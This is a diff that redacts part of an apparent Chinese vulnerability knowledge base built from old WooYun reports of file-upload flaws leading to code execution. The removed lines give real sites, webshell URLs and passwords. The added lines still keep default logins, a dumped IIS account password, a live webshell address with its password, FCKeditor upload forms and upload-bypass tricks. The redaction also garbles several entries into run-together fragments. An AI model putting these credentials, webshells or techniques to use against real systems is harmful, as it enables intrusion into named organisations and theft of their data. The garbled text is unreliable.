@@ -3480,7 +3480,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 乐视网的一个ftp服务器存在弱口令ftp://115.182.51.26/user：user大致翻阅了一下，泄露了一些日志文件另外还有一些小问题，顺便提一下某服务器phpinfo一枚http://115.182.51.44/phpinfo.php某系统2个备份文件泄露http://115.182.51.144:8000/uploadsys.php.bak文件上传的http://115.182.51.144:8000/login.php.bak
+**详情**: 乐视网的一个ftp服务器存在弱口令ftp://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -3502,7 +3502,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://s.haier.com内部员工系统,开放注册,新建问卷,上传logo,未验证.whoamint authority\system
+**详情**: https://example.com/[已脱敏] authority\system
 
 **POC**: (见原文)
 
@@ -3570,7 +3570,7 @@
 
 **详情**: 
 
-**POC**: http://ncstlyy.jxedu.gov.cn/js/fckeditor/editor/dialog/fck_about.html编辑器版本过低构造上传html<form id="frmUpload" enctype="multipart/form-data"action="http://ncstlyy.jxedu.gov.cn/js/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php?Type=Media" method="post">Uplo
+**POC**: https://example.com/[已脱敏] id="frmUpload" enctype="multipart/form-data"action="https://example.com/[已脱敏]" method="post">Uplo
 
 **绕过**: 直接利用
 
@@ -3578,8 +3578,8 @@
 ---
 
 ---
-### [wooyun-2012-06067] 新浪某分站文件上传漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2012-06067] 某社交平台某分站文件上传漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -3590,9 +3590,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新浪招聘 http://career.sina.com.cn/ 设置个人简历时上传照片的地方，通过伪造文件名、文件头及content-type可上传任意文件。不过有点鸡肋，因为文件保存的服务器不是career.sina.com.cn 而是 cache.mars.sina.com.cn，这个cache看名字就能猜到可能是个专门的放静态文件的图床，我传了php、asp啥的上去也执行不了，asp aspx不支持，php应该是没权限执行脚本。 但这确实是上传漏洞……
+**详情**: 某社交平台招聘 https://example.com/[已脱敏] 设置个人简历时上传照片的地方，通过伪造文件名、文件头及content-type可上传任意文件。不过有点鸡肋，因为文件保存的服务器不是career.sina.com.cn 而是 cache.mars.sina.com.cn，这个cache看名字就能猜到可能是个专门的放静态文件的图床，我传了php、asp啥的上去也执行不了，asp aspx不支持，php应该是没权限执行脚本。 但这确实是上传漏洞……
 
-**POC**: http://cache.mars.sina.com.cn/nd/career/200709job/201204/20120415045701pic96.phphttp://cache.mars.sina.com.cn/nd/career//200709job/201204/20120415052818pic84.asphttp://cache.mars.sina.com.cn/nd/career//200709job/201204/20120415052516pic61.aspxhttp://cache.mars.sina.com.cn/nd/career//200709job/201204
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3614,7 +3614,7 @@
 
 **详情**: FCK编辑器漏洞
 
-**POC**: 检测txt：http://goldpen.ccidnet.com/goldpen/test.txt无破坏
+**POC**: 检测txt：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3634,7 +3634,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bbs.uc.cn/kg/这里自定义图片，可以任意上传。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 虽然没能成功执行php,但是任意文件传0.0
 
@@ -3656,9 +3656,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度或者谷歌搜索：登录到新点网上开评标系统可以获取搜索引擎已经收录的案例20个左右，当然有些系统可能没有建设在互联网，也可能没有被搜索引擎爬取到。
+**详情**: 某搜索引擎或者谷歌搜索：登录到新点网上开评标系统可以获取搜索引擎已经收录的案例20个左右，当然有些系统可能没有建设在互联网，也可能没有被搜索引擎爬取到。
 
-**POC**: 案例：http://www.dfzbcg.gov.cn/epointbid_dfpb/问题1：默认账户密码(用户名:密码)<--------------------------------------------------------------------->jg:11111 开标监管（这个在我测试的多个系统中都存在，请审核员使用该账户测试）kb:11111 开标admin:11111开标管理员gzry：11111 工作人员and so on.登录系统可以默认查看到若干招投标项目<-------------------------------------------------------
+**POC**: 案例：https://example.com/[已脱敏])<--------------------------------------------------------------------->jg:11111 开标监管（这个在我测试的多个系统中都存在，请审核员使用该账户测试）kb:11111 开标admin:11111开标管理员gzry：11111 工作人员and so on.登录系统可以默认查看到若干招投标项目<-------------------------------------------------------
 
 **绕过**: 直接利用
 
@@ -3678,7 +3678,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 500强！！！一句话http://**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080323244476070434708.jsp密码tom上传点http://**.**.**.**/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeigh
+**详情**: 500强！！！一句话http://**.**.**.**/defaultroothttps://example.com/[已脱敏]
 
 **POC**: 另外，http://**.**.**.**/news_view.asp?id=2211这是一个盲注SQL。因为不在同一服务器，就不作证明了。
 
@@ -3702,7 +3702,7 @@
 
 **详情**: 前人漏洞WooYun: 某通用气象服务后台存在安全漏洞(任意文件上传可提权/越权访问/弱口令/LED大屏信息修改+电视控制)同一套系统技术支持：重庆沃尔德科技有限公司存在漏洞的文件是install.aspx，因为重装之后不会自动删除文件，导致可以任意重置管理员的密码
 
-**POC**: 由于有的管理员密码已经被修改过了，所以先修改为其它密码然后再测试重置为了aaaaaaaa访问http://ybtv.artword323.com:8012/install.aspx点击安装，提示安装成功此时重新使用admin/123456登录访问汇总http://ybtv.artword323.com:8012/install.aspxhttp://tnantv.artword323.com:8012/install.aspxhttp://dztv.artword323.com:8012/install.aspxhttp://lptv.artword323.com:8012/install.a
+**POC**: 由于有的管理员密码已经被修改过了，所以先修改为其它密码然后再测试重置为了aaaaaaaa访问https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3722,9 +3722,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 奇怪的文件管理系统弱口令admin/admin，进入后可查看站点根目录下所有文件，浏览的时候发现了fck，顺带一起提交~~（求邀请码啊，我都提3个了，这次必须放大招了）奇怪的文件管理系统（亮点是有上传、编辑功能）http://www.xmhlkj.gov.cn/file/index.aspadmin/admin进来以后站点根目录下发现一只大马http://www.xmhlkj.gov.cn/z.aspxxlz0iza1看看这个网站的结构我找呀找呀web.config---里面有数据库配置，收藏发现目标fckhttp://www.xmhlkj.gov.cn/ManageModule/Info/fckeditor存在上传漏洞连sample都没删剩下就不用我说了吧，顺带说一句，该服务器已经被提权了隐藏帐号gui$提权的工具在（貌似是2批人）C:\wmpub\D:\HuLi\R4\Include\
+**详情**: 奇怪的文件管理系统弱口令admin/admin，进入后可查看站点根目录下所有文件，浏览的时候发现了fck，顺带一起提交~~（求邀请码啊，我都提3个了，这次必须放大招了）奇怪的文件管理系统（亮点是有上传、编辑功能）https://example.com/[已脱敏]
 
-**POC**: 菜刀--服务器权限很大数据库--库挺多的一句话地址http://www.xmhlkj.gov.cn/HLSciTechNets/UploadFiles/image/nihao.asp/33.jpg密码1，我只传了这个，呵呵，其它没有动
+**POC**: 菜刀--服务器权限很大数据库--库挺多的一句话地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3744,7 +3744,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.nyagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html编辑器漏洞导致可上传木马
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3766,7 +3766,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://183.61.117.149:8080/ admin/admin直接进入，里面有发布公告等功能，以及文件上传功能，未授权不进行下一步上传文件测试
+**详情**: http://[IP已脱敏] admin/admin直接进入，里面有发布公告等功能，以及文件上传功能，未授权不进行下一步上传文件测试
 
 **POC**: (见原文)
 
@@ -3788,7 +3788,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.站点是：http://campus.suning.com/snjyw/2.后台地址http://campus.suning.com/snjyw/login.jsp3.直接admin/admin登录网站后台4.查看账号管理发现存在20多为管理员，全是弱口令
+**详情**: 1.站点是：https://example.com/[已脱敏]
 
 **POC**: 1.后台的上传文件管理可以直接上传jsp后门2.菜刀连上，文件管理如下：3.数据库账号root，密码也是弱口令，真的得注意啊这些个细节问题4.应用也是root跑的，
 
@@ -3812,7 +3812,7 @@
 
 **详情**: 本人只在topic话题下上传了，貌似头像上传那里也存在该问题（没测试）点击话题图像，就可以编辑上传图像了。使用火狐的TAMPER DATA插件，并打开开始截获。选择一个2bb.jpg（内涵php一句话的正常图片即可)该文件目录内还有一个2bb.php（留作备用)在tamaper data内修改数据，把2bb.JPG改成2bb.php即可就可以看到上传上去的php图片小马了，但是这个是经过处理的只要把url后面的100X100参数或者50x50参数去除，就可以得到一个没有经过处理的PHP小马了。
 
-**POC**: 官方已经拿到shell了马儿地址http://wenda.anwsion.com/topic/%E7%BC%96%E8%BE%91%E5%99%A8http://wenda.anwsion.com/uploads/topic/20120911/134730998609.php密码cmd。读了下源代码，发现一点问题，可以讨论讨论，加我qq：114967639搞这个源码的初衷很简单，哥要用啊.....
+**POC**: 官方已经拿到shell了马儿地址https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3838,7 +3838,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 百度一大截
+**修复**: 某搜索引擎一大截
 ---
 
 ---
@@ -3854,9 +3854,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 改管理系统为北京昆仑亿发科技发展有限公司的产品先拿官网演示一下http://www.eastfair.com/fair/admin/upProduct.aspasp文件上传成功抓包找路径  菜刀连之
+**详情**: 改管理系统为北京昆仑亿发科技发展有限公司的产品先拿官网演示一下https://example.com/[已脱敏]  菜刀连之
 
-**POC**: 看一下官网展示的客户案例均存在同样问题  可上传任意asp文件http://www.qgtjh.com/admin/upProduct.asphttp://www.musicchina-expo.com/admin/upProduct.asphttp://www.cgof.cn/admin/upProduct.asphttp://www.eastfair.com/fair/admin/upProduct.asp等等 google搜一下估计还有很多的
+**POC**: 看一下官网展示的客户案例均存在同样问题  可上传任意asp文件https://example.com/[已脱敏] google搜一下估计还有很多的
 
 **绕过**: 直接利用
 
@@ -3876,9 +3876,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://webcall.airchina.com.cn:9090/webstat/ucstarclient_webcall/client/ucallclient_1.jsp问题原因是由于fck配置不当造成的poc:POST http://webcall.airchina.com.cn:9090/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/simpleuploader?Type=File HTTP/1.1Host: webcall.airchina.com.cn:9090Connection: keep-aliveContent-Length: 189Cache-Control: max-age=0Accept: text/html,application/xhtml
+**详情**: https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Host: webcall.airchina.com.cn:9090Connection: keep-aliveContent-Length: 189Cache-Control: max-age=0Accept: text/html,application/xhtml
 
-**POC**: http://webcall.airchina.com.cn:9090/UserFiles/Image/is.jspf
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3898,7 +3898,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 嘉兴市秀洲区发展和改革局http://www.jxxzfgj.gov.cn/user/login.aspxNetcms oday上传漏洞点注册之后点击发表文章然后在站内信息那块， 给自己发送个站内信，附件里直接传马。读取IID信息发现存在其他gov站。。
+**详情**: 嘉兴市秀洲区发展和改革局https://example.com/[已脱敏] oday上传漏洞点注册之后点击发表文章然后在站内信息那块， 给自己发送个站内信，附件里直接传马。读取IID信息发现存在其他gov站。。
 
 **POC**: ID IIS_USER IIS_PASS Domain Path1 IUSR_SVCTAG-1F77L1X 3`tO|UG{G3MKz% :80: D:\wwwroot\创泉直销2 IUSR_SVCTAG-1F77L1X 3`tO|UG{G3MKz% :80:www.jxlndx.com D:\wwwroot\嘉兴老年大学3 IUSR_SVCTAG-1F77L1X 3`tO|UG{G3MKz% :80:www.katsushiro.com.cn D:\wwwroot\胜代机械4 IUSR_SVCTAG-1F77L1X 3`tO|UG{G3MKz% :80:www.jxwhpx.com D:\w
 
@@ -3930,8 +3930,8 @@
 ---
 
 ---
-### [wooyun-2013-021796] 中国移动400 某管理后台沦陷
-**厂商**: 中国移动 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2013-021796] 某运营商400 某管理后台沦陷
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -3942,7 +3942,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"><html><head><title>Untitled</title></head><body><form id="frmUpload" enctype="multipart/form-data"action="http://221.180.20.72/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php?Type=Media" method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUplo
+**详情**: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"><html><head><title>Untitled</title></head><body><form id="frmUpload" enctype="multipart/form-data"action="http://[IP已脱敏] method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUplo
 
 **POC**: [*] 基本信息 [ 	Linux xlp102 2.6.18-238.9.1.el5.028stab089.1 #1 SMP Thu Apr 14 14:06:01 MSD 2011 x86_64(www-data) ][/]$ iduid=502(www-data) gid=502(www-data) groups=502(www-data)[/]$
 
@@ -3966,11 +3966,11 @@
 
 **详情**: IIS6.0文件名解析漏洞，只要在使用IIS6.0的桃源网络硬盘上传一个php木马:123;asp;123.jpg，然后通过show.aspx?type=1&filepath=http://123/的方法取文件路径，最后执行，即可。
 
-**POC**: http://xzdmlxx.com/hack.txthttp://disk.fhchzx.com:81/hack.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: http://xzdmlxx.com/hack.txthttp://disk.fhchzx.com:81/hack.txt
+**修复**: https://example.com/[已脱敏]
 ---
 
 ---
@@ -4008,7 +4008,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.url:http://lefen.lenovo.com/index.php/kebi/2.上传图片处，只验证了图片类型，未验证图片格式。（上传插入一句话内容的jpg文件，然后burp抓包，修改上传文件后缀为php。）图片修改：Burp上传抓包修改php就不说了。
+**详情**: 1.url:https://example.com/[已脱敏]
 
 **POC**: 1.权限、版本2.数据库3.用户信息泄漏4.另外，站点还有目录浏览
 
@@ -4030,9 +4030,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 后台页面可直接访问无需登录 http://www.jiemai-tech.com/admin/infoManage.do任意后缀上传。
+**详情**: 后台页面可直接访问无需登录 https://example.com/[已脱敏]
 
-**POC**: 后台页面可直接访问无需登录 http://www.jiemai-tech.com/admin/infoManage.do任意后缀上传。
+**POC**: 后台页面可直接访问无需登录 https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4052,9 +4052,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞位于乌云兄的WooYun: 江苏卫视大量演员名单泄露，手机，QQ，照片,，地址一应俱全，涉及的子站中。http://hd.jsbc.com/bxlz/index.aspx虽然上传后返回不了上传地址，但是配合wooyun-2013-022201，可以查看到上传地址。另外，为了防止二次进入，已对漏洞页面进行改名处理（index_tested_by_3king.aspx)
+**详情**: 漏洞位于乌云兄的WooYun: 江苏卫视大量演员名单泄露，手机，某互联网公司，照片,，地址一应俱全，涉及的子站中。https://example.com/[已脱敏])
 
-**POC**: 1.填好其它信息后，直接选择asp、php程序进行上传。2.从http://hd.jsbc.com/bxlz/admin/search.aspx搜索前面填写的姓名。3.查看上传的图片地址。4.虽然提示目录有执行权限限制，但输入任意.aspx路径后返回.net报错。显然由于配置失误，可以执行.net程序！！5.上传aspx文件，得shell，进服务器。6.发现同服务器内大量子站点。7.服务器内FlashFXP中储存有一些内网FTP密码。8.数据库密码（sa权限）9.大量数据库10.大量用户信息（详细信息+明文密码，70W）
+**POC**: 1.填好其它信息后，直接选择asp、php程序进行上传。2.从https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4062,8 +4062,8 @@
 ---
 
 ---
-### [wooyun-2011-02702] 新浪某点上传不过滤
-**厂商**: 新浪 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2011-02702] 某社交平台某点上传不过滤
+**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -4074,9 +4074,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 什么都可以上传，可以欺骗挂马哦http://t.auto.sina.com.cn/sheyingdasai/iframe/upload.php?sid=26
+**详情**: 什么都可以上传，可以欺骗挂马哦https://example.com/[已脱敏]
 
-**POC**: http://t.auto.sina.com.cn/sheyingdasai/iframe/upload.php?sid=26
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4120,7 +4120,7 @@
 
 **详情**: xxwz.cxedu.gov.cn  教育索引系统使用有漏洞的siteserver 可被渗透，上面有100多中小学站点测试过程:直接上图 访问漏洞页面获得返回信息修改返回信息 将302 修改成200访问上传页面选择zip压缩包进行上传上传请求包 如下:获得上传后页面:使用菜刀连接发现首页的所有站点 都在这个服务器上有100多个哦数据库使用sa连接没有进一步测试
 
-**POC**: http://xxwz.cxedu.gov.cn//sitefiles/siteTempLates/test/test.asp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4140,9 +4140,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://drops.wooyun.org/tips/2031说的问题很清楚我也不重复了，乌云的几个上传好像都没做文件内容的检查 包括发布漏洞编辑器zone编辑器drops编辑器第一次测试的结果很不顺利主站发布处上传的图片有referer检查zone的上传到wzone.sinaapp.com了drops的传完了打开居然是0字节原本已经想放弃了，盯着fiddler里的http头看了半天索性死马当活马医试试referer的校验机制，结果第一次尝试修改referer为http://www.baidu.com/www.wooyun.org/就成功了看来哪里都有加班写错代码的程序猿啊referer解决了 其他就好办了 新建一个flash项目，先get一下http://www.wooyun.org/teams/（选这个没别的理由，就因为页面内容少。。速度快一点 token几乎每个页面都有）获取/u
+**详情**: https://example.com/[已脱敏] 包括发布漏洞编辑器zone编辑器drops编辑器第一次测试的结果很不顺利主站发布处上传的图片有referer检查zone的上传到wzone.sinaapp.com了drops的传完了打开居然是0字节原本已经想放弃了，盯着fiddler里的http头看了半天索性死马当活马医试试referer的校验机制，结果第一次尝试修改referer为https://example.com/[已脱敏] 其他就好办了 新建一个flash项目，先get一下https://example.com/[已脱敏] token几乎每个页面都有）获取/u
 
-**POC**: 访问http://qaz.me/www.wooyun.org/csrf.html查看控制面板
+**POC**: 访问https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -4150,7 +4150,7 @@
 ---
 
 ---
-### [wooyun-2013-021631] ThinkSNS开发的微博程序存在过滤不严
+### [wooyun-2013-021631] ThinkSNS开发的某社交平台程序存在过滤不严
 **厂商**: ThinkSNS | **年份**: 2013 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
@@ -4184,7 +4184,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞有疑问，该图片由于审核慢了，应该被管理员还原了，重新组织了下疑问，可以复现的。动软商城系统 官网：http://www.maticsoft.com/shop.aspx demo：http://shop1.maticsoft.cn/ 先相中一枚想删除的图片： http://shop1.maticsoft.cn/Upload/AD/34/201306251621094269405.jpg使用测试账号（普通注册用户即可） 注册用户登录后创建一个小组，http://shop1.maticsoft.cn/SNS/Group/Create，创建是选择一个正常文件上传后保存。然后再修改创建的小组，审查元素，找到以下内容：value为目标删除文件路径地址点击保存，此时目标图片已经被删除
+**详情**: 漏洞有疑问，该图片由于审核慢了，应该被管理员还原了，重新组织了下疑问，可以复现的。动软商城系统 官网：https://example.com/[已脱敏] demo：https://example.com/[已脱敏] 先相中一枚想删除的图片： https://example.com/[已脱敏] 注册用户登录后创建一个小组，https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -4206,9 +4206,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主站问题文件http://www.kysec.cn/qk/tools/Main.aspx通过该文件管理，你可以遍历http://www.kysec.cn/qk/tools/main.aspx?path=/../自己控制path参数，页面上操作经常把路径弄错
+**详情**: 主站问题文件https://example.com/[已脱敏]
 
-**POC**: 上传http://www.kysec.cn/qk/tools/Main.aspxPOST http://www.kysec.cn/qk/tools/Main.aspx?act=upload&path=/../../ HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.kysec.cn/qk/tools/main.aspxAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; 
+**POC**: 上传https://example.com/[已脱敏] https://example.com/[已脱敏] HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: https://example.com/[已脱敏] zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; 
 
 **绕过**: 直接利用
 
@@ -4228,9 +4228,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://mba.nuaa.edu.cn/wwwroot.rar源代码下载地址导致数据库一起被下载了
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://mba.nuaa.edu.cn/wwwroot.rar源代码下载地址导致数据库一起被下载了
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4252,7 +4252,7 @@
 
 **详情**: 通达OA系统过滤机制不够严谨，导致服务器沦陷！服务器沦陷
 
-**POC**: 通达OA系统官方演示系统URL =  http://t9.go2oa.com利用试用账户登录进去在控制面板-> 昵称与头像 -> 上传  可上传任意文件。上传SELL --> url = http://t9.go2oa.com/t9/attachment/avatar/1122.jspshell  没有删除。你们去删除吧。在shell里可执行cmd命令！netstat -an   远程桌面端口 3399服务器为毛装 数字安全？？没做任何破坏，拒绝查水表！能不能送一套OA系统 ，能行话，感谢万分。求OA系统一套！！！！
+**POC**: 通达OA系统官方演示系统URL =  https://example.com/[已脱敏] 昵称与头像 -> 上传  可上传任意文件。上传SELL --> url = https://example.com/[已脱敏]  没有删除。你们去删除吧。在shell里可执行cmd命令！netstat -an   远程桌面端口 3399服务器为毛装 数字安全？？没做任何破坏，拒绝查水表！能不能送一套OA系统 ，能行话，感谢万分。求OA系统一套！！！！
 
 **绕过**: 直接利用
 
@@ -4272,7 +4272,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随便输入了一个关键词啊.inurl:Infos/MoreInfos.aspx主要针对政府网站。随便找了俩处啊。http://www.xmhlkj.gov.cn/file/index.asphttp://www.astc.gov.cn/file/index.asp默认管理员admin/adminhttp://www.xmhlkj.gov.cn/ManageModule/Info/fckeditor/editor/filemanager/connectors/uploadtest.htmlhttp://www.astc.gov.cn/ManageModule/Info/fckeditor/editor/filemanager/connectors/uploadtest.htmlhttp://www.jimeikj.gov.cn/ManageModule/Info/fckeditor/edito
+**详情**: 随便输入了一个关键词啊.inurl:Infos/MoreInfos.aspx主要针对政府网站。随便找了俩处啊。https://example.com/[已脱敏]
 
 **POC**: 任意文件上传,没有任何现在可以直接提权服务器啊。直接远程终端就可以进入服务器.危害挺严重的啦。配合IIS6.0解析漏洞，合理运用。权限撒滴还是蛮大啦。ftb.imagegallery.aspx可上传图片，但未对图片进行重命名，可利用IIS解析漏洞1.asp;.gif方式上传脚本木马。测试了下，未深入。
 
@@ -4318,7 +4318,7 @@
 
 **详情**: 软航NTKO大文件上传IE控件的AddLocalFile函数存在安全漏洞，可导致EIP被控制，从而执行任意代码控制IE浏览器用户的系统
 
-**POC**: 下面的这个演示视频揭示了该漏洞在安装了该控件的IE用户浏览含有可以代码的网页时直接触发，无需交互操作，EIP被指向00430043（unicode "CC"字符串），测试环境是win7+IE11http://1drv.ms/1bJpo6O
+**POC**: 下面的这个演示视频揭示了该漏洞在安装了该控件的IE用户浏览含有可以代码的网页时直接触发，无需交互操作，EIP被指向00430043（unicode "CC"字符串），测试环境是win7+IE11https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4338,7 +4338,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1# fck上传http://sdgs.shenhuagroup.com.cn/manage/fckeditor/editor/filemanager/connectors/test.html#二次上传2# 物理路径信息泄露
+**详情**: 1# fck上传https://example.com/[已脱敏] 物理路径信息泄露
 
 **POC**: (见原文)
 
@@ -4384,7 +4384,7 @@
 
 **详情**: 福建省营运车辆卫星定位安全服务系统上传漏洞
 
-**POC**: 福建省营运车辆卫星定位安全服务系统http://www.fjjt.gov.cn/ztzl/gps/属于福建交通厅的分站，该网站上提供了对营运车辆卫星定位服务查询http://218.85.65.5:8080/login2.jsp尝试使用弱口令失败对IP 218.85.65.5 服务器进行扫描。发现该服务器开放了另外一个端口http://218.85.65.5:8080/http://218.85.65.5:8086/ 其中这个端口可以遍历文件http://218.85.65.5:8086/iflow/verify/public_result.jsp?currentpage=6318发现该管理系
+**POC**: 福建省营运车辆卫星定位安全服务系统https://example.com/[已脱敏] [IP已脱敏] 服务器进行扫描。发现该服务器开放了另外一个端口http://[IP已脱敏] 其中这个端口可以遍历文件http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -4404,7 +4404,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 详细没什么讲无意中百度发现的，看图说明http.oa.broad-asia.net/thank.asp密码：showcctv应该成了别人傀儡机很久了。
+**详情**: 详细没什么讲无意中某搜索引擎发现的，看图说明http.oa.broad-asia.net/thank.asp密码：showcctv应该成了别人傀儡机很久了。
 
 **POC**: http.oa.broad-asia.net/thank.asp密码：showcctv应该成了别人傀儡机很久了。
 
@@ -4448,9 +4448,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 无意间看到这个平台FE协作办公平台测试版本：5.2.1版本大于5.2.1未受影响，小于5.2.1的版本未测在网上用百度找了一下直接访问/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../可以通过../跳转目录，导致敏感信息泄露
+**详情**: 无意间看到这个平台FE协作办公平台测试版本：5.2.1版本大于5.2.1未受影响，小于5.2.1的版本未测在网上用某搜索引擎找了一下直接访问/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../可以通过../跳转目录，导致敏感信息泄露
 
-**POC**: 无意间看到这个平台FE协作办公平台测试版本：5.2.1版本大于5.2.1未受影响，小于5.2.1的版本未测在网上用百度找了一下直接访问/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../可以通过../跳转目录，导致敏感信息泄露
+**POC**: 无意间看到这个平台FE协作办公平台测试版本：5.2.1版本大于5.2.1未受影响，小于5.2.1的版本未测在网上用某搜索引擎找了一下直接访问/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../可以通过../跳转目录，导致敏感信息泄露
 
 **绕过**: 直接利用
 
@@ -4470,7 +4470,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://elearning.100e.com/EngNews/NewsUpLoad.asp这里可以上传任意文件，但是好像要覆盖到首页的新闻，上传以后去数据库删除掉就可以了
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4492,9 +4492,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度搜索 正方软件股份有限公司 版权所有  联系电话：0571-89902828百度为您找到相关结果约1,450个全部存在FCK编辑器漏洞
+**详情**: 某搜索引擎搜索 正方软件股份有限公司 版权所有  联系电话：0571-89902828某搜索引擎为您找到相关结果约1,450个全部存在FCK编辑器漏洞
 
-**POC**: 1----http://218.75.197.120:88/fckeditor//editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp2----http://jsyd.suda.edu.cn/fckeditor//editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp3----http://xk.suda.edu.c
+**POC**: 1----http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -4516,7 +4516,7 @@
 
 **详情**: 第二个了
 
-**POC**: http://www.yajsgh.gov.cn/admin/netQA/WSDCQCAdd.aspx
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4524,8 +4524,8 @@
 ---
 
 ---
-### [wooyun-2011-01453] 新浪上传过滤不严
-**厂商**: 新浪 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2011-01453] 某社交平台上传过滤不严
+**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -4536,9 +4536,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新浪网分级目录过滤不严，拥有上传权限。
+**详情**: 某社交平台网分级目录过滤不严，拥有上传权限。
 
-**POC**: http://pic.data.games.sina.com.cn/upload.php
+**POC**: https://example.com/[已脱敏]
 
